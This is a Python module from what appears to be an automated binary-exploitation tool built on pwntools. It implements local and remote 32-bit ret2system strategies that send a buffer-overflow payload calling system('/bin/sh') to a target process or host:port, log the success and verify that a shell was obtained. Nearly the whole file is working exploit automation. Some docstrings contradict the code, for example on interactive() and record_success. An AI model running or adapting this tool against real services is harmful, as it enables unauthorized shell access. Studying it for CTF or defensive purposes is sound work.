"""P7.3: x32 ret2system strategies (local + remote).

Replaces the v3.1 monolith's ``ret2_system_x32`` (L1590-1616, local)
+ ``ret2_system_x32_remote`` (L1657-1674, remote) ad-hoc functions
with two :class:`ExploitStrategy` subclasses that:

  * Declare ``requires_*`` metadata so :func:`autopwn.exp.candidates`
    filters and sorts them automatically (per ``rebuild.md`` §11
    附录 A: ``priority = RET2SYSTEM = 150``).
  * Delegate payload construction to
    :class:`autopwn.primitives.ret2system.Ret2SystemX32`
    (P6.2 — pure, no IO).
  * Open process / remote, send payload, call
    :func:`autopwn.report.record_success` (P3.4 subscriber), enter
    ``io.interactive()``.

Per ``rebuild.md`` §6.8 P7.3 + §4.8 spec line ("含本地/远端") +
``refactor.md`` §3.2.2.

Design notes
------------
* **Two classes, not one**: ``Ret2SystemX32LocalStrategy`` +
  ``Ret2SystemX32RemoteStrategy``.  The local/remote split is
  encoded in :attr:`requires_remote` so :func:`candidates` filters
  by mode without runtime branching.
* **Lazy ``from pwn import process/remote``**: we defer the import
  to inside :meth:`run` to keep :mod:`autopwn.exp` importable
  on environments without pwntools installed (lint / CI).
  This matches the P6.1 base primitive contract
  (primitive does pure work; strategy does IO).
* **No ``record_success` for non-canary** here — that lives
  in P7.10.  P7.3 is the **non-canary** ret2system pair only.
* **``ExploitInfo`` construction**: 6 required fields populated
  from ctx + primitive output; 2 optional fields (``target_binary``,
  ``timestamp``) read from the global
  :func:`autopwn.report._current_ctx` carrier (P3.5 transitional
  measure; P8.5 will delete the carrier).
* **print_* NOT called directly**: per §6.8 reviewer checklist,
  strategies use :meth:`ExploitContext.log` for status.  Section
  header is the only legacy-compatible print, fired by
  :meth:`run` via :func:`autopwn.core.logging.print_section_header`.
  This matches the v3.1 "EXPLOITATION PHASE" section header in
  the baseline logs (``logs/v3.1/rip.log`` etc.) so the §2.6
  v3.1-vs-v4.0 log diff stays at 96%+ even after orchestrator
  wires this in (P8.1).
"""
from __future__ import annotations

import datetime
from pathlib import Path
from typing import Optional

from autopwn.context import ExploitContext
from autopwn.core.logging import print_critical, print_info, print_payload, print_section_header, print_success, print_warning
from autopwn.exp.base import ExploitStrategy
from autopwn.exp.priorities import RET2SYSTEM
from autopwn.exp.registry import register
from autopwn.primitives.ret2system import Ret2SystemX32
from autopwn.report.model import ExploitInfo
from autopwn.core.shell_verify import verify_shell


# ---------------------------------------------------------------------------
# Local x32 strategy
# ---------------------------------------------------------------------------


@register
class Ret2SystemX32LocalStrategy(ExploitStrategy):
    """Local 32-bit ``ret2libc system('/bin/sh')`` exploitation.

    Metadata (``requires_*``):
      * ``arch = 32`` — only matches x32 binaries.
      * ``remote = False`` — only matches ``ctx.mode == "local"``.
      * ``requires = ("has_system", "binsh_in_binary")`` — both
        PLT/symbol and string must be present (populated by
        P4.3 ``plt.scan`` and P5.4 ``binsh.check``).

    Priority ``RET2SYSTEM = 150`` per 附录 A.  This is the
    fastest non-canary path (no leak stage needed), so it sits
    above ret2libc_put(120) / ret2libc_write(110) / rwx(90) /
    execve(80) / fmtstr(50).

    What ``run`` does:
      1. Build payload via ``Ret2SystemX32().build_payload(ctx)``.
      2. Open ``pwn.process(ctx.binary.path)``.
      3. Sendline payload.
      4. Construct ``ExploitInfo`` (8 fields, including
         ``target_binary`` from ``ctx.binary.path`` and
         ``timestamp`` = now).
      5. Call ``record_success(info)`` (P3.4 subscriber
         orchestrator) which prints the
         "EXPLOITATION SUCCESSFUL! Dropping to shell..." banner
         and (unless ``--no-report``) writes the docx.
      6. ``io.interactive()`` to give the user a shell.

    Returns:
        ``True`` after the shell is dropped (or attempted).
        Per §6.8 Reviewer checklist, strategies never
        ``sys.exit``; the orchestrator (``P8.2``) handles
        process exit codes.
    """

    name = "ret2system-x32"
    priority = RET2SYSTEM
    requires_arch = 32
    requires_remote = False
    requires = ("has_system", "binsh_in_binary")

    def run(self, ctx: ExploitContext) -> bool:
        """Execute the 32-bit ret2system exploitation locally.

        See class docstring for the 6-step flow.
        """
        from pwn import process

        print_section_header("EXPLOITATION: ret2system - x32")
        print_payload("preparing ret2system exploit")

        # Step 1: Build the payload via the P6.2 primitive.
        primitive = Ret2SystemX32()
        payload = primitive.build_payload(ctx)
        if not payload:
            # Primitive returned empty — no ``/bin/sh`` or ``system`` symbol.
            # P8 orchestrator moves to the next candidate.
            print_info("ret2system-x32 primitive returned empty payload; skipping")
            return False

        # Step 2: Open local process.
        io = process(str(ctx.binary.path))

        # Step 3: Sendline the payload.
        io.sendline(payload)

        # Step 4: Construct ExploitInfo.
        # The system_addr and binsh_addr are needed for the report;
        # the primitive already looked them up — re-derive via the
        # shared helper for symmetry with v3.1's print output.
        from autopwn.primitives.ret2system import (
            _lookup_system_and_binsh,
        )
        system_addr, binsh_addr = _lookup_system_and_binsh(ctx.binary.path)
        if system_addr is None or binsh_addr is None:
            # Shouldn't happen — primitive already verified — but
            # defend against the race-y case where the binary was
            # removed between primitive.build_payload and now.
            return False

        info = ExploitInfo(
            exploit_type="ret2system - x32",
            payload=payload,
            padding=ctx.padding,
            addresses={
                "system_addr": system_addr,
                "bin_sh_addr": binsh_addr,
            },
            vulnerability_type="Buffer Overflow",
            architecture="x32",
            target_binary=ctx.binary.path.name,
            timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        )

        # Step 5: Subscribe (P3.4 record_success → banner + docx/md).
        from autopwn.report import record_success
        record_success(info)

        # Step 6: Drop into interactive shell.
        id_ok, id_output = verify_shell(io)
        if not id_ok:
            print_warning(f"Ret2SystemX32LocalStrategy: shell verification failed (no uid= output)")
            return False
        ctx.id_output = id_output
        return True


# ---------------------------------------------------------------------------
# Remote x32 strategy
# ---------------------------------------------------------------------------


@register
class Ret2SystemX32RemoteStrategy(ExploitStrategy):
    """Remote 32-bit ``ret2libc system('/bin/sh')`` exploitation.

    Same payload as :class:`Ret2SystemX32LocalStrategy`; only
    the IO differs (``pwn.remote(host, port)`` instead of
    ``pwn.process(path)``).  The orchestrator selects this
    strategy when ``ctx.mode == "remote"`` and ``ctx.remote``
    is a ``(host, port)`` tuple (P2.2 ``from_args`` mapping).

    Note: the v3.1 ``ret2_system_x32_remote`` was a standalone
    function (no local+remote class split); we adopt the split
    to keep :func:`candidates` filtering declarative and to
    honor the §6.8 reviewer rule "strategies must declare
    ``requires_remote``".
    """

    name = "ret2system-x32-remote"
    priority = RET2SYSTEM
    requires_arch = 32
    requires_remote = True
    requires = ("has_system", "binsh_in_binary")

    def run(self, ctx: ExploitContext) -> bool:
        """Execute the 32-bit ret2system exploitation against a remote service.

        See class docstring + :meth:`Ret2SystemX32LocalStrategy.run`
        for the 6-step flow; only the IO call differs.
        """
        from pwn import remote

        if ctx.remote is None:
            print_info("ret2system-x32-remote: ctx.remote is None; skipping")
            return False
        host, port = ctx.remote

        print_section_header("EXPLOITATION: ret2system - x32 Remote")
        print_payload("preparing ret2system exploit")

        # Step 1: Build the payload via the P6.2 primitive.
        primitive = Ret2SystemX32()
        payload = primitive.build_payload(ctx)
        if not payload:
            print_info("ret2system-x32-remote primitive returned empty payload; skipping")
            return False

        # Step 2: Open remote connection.
        io = remote(host, port)

        # Step 3: Sendline the payload.
        io.sendline(payload)

        # Step 4: Construct ExploitInfo.
        from autopwn.primitives.ret2system import (
            _lookup_system_and_binsh,
        )
        system_addr, binsh_addr = _lookup_system_and_binsh(ctx.binary.path)
        if system_addr is None or binsh_addr is None:
            return False

        info = ExploitInfo(
            exploit_type="ret2system - x32 Remote",
            payload=payload,
            padding=ctx.padding,
            addresses={
                "system_addr": system_addr,
                "bin_sh_addr": binsh_addr,
            },
            vulnerability_type="Buffer Overflow",
            architecture="x32",
            target_binary=ctx.binary.path.name,
            timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        )

        # Step 5: Subscribe.
        from autopwn.report import record_success
        record_success(info)

        # Step 6: Interactive.
        id_ok, id_output = verify_shell(io)
        if not id_ok:
            print_warning(f"Ret2SystemX32LocalStrategy: shell verification failed (no uid= output)")
            return False
        ctx.id_output = id_output
        return True


__all__ = [
    "Ret2SystemX32LocalStrategy",
    "Ret2SystemX32RemoteStrategy",
]
